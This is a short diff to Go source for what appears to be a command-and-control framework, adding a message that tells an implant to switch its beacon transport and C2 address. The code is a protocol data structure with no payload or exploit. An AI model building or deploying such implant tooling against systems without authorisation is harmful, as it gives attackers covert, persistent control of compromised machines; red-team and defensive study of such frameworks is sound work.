@@ -85,8 +85,20 @@ type TaskResult struct {
 	EncryptedWithTaskKey bool `json:"etk,omitempty"`
 }
 
+// TransportMigration asks an implant to switch its beacon transport on the
+// next send. It travels inside the AEAD-authenticated beacon response, so the
+// agent can validate it before applying anything. Session keys, the frame
+// sequence and the pending-result queue are deliberately untouched: a switch
+// is a routing change, not a re-enrollment.
+type TransportMigration struct {
+	Transport string `json:"transport"`
+	C2URL     string `json:"c2_url,omitempty"`
+}
+
 // BeaconResponse is sent by server to agent in reply to a check-in.
 type BeaconResponse struct {
+	// TransportMigrate is a one-shot explicit transport switch; nil means none.
+	TransportMigrate *TransportMigration `json:"transport_migrate,omitempty"`
 	// Compression advertises the inbound gzip capability ("gzip") to the peer.
 	Compression     string `json:"comp,omitempty"`
 	Tasks           []Task `json:"tasks"`
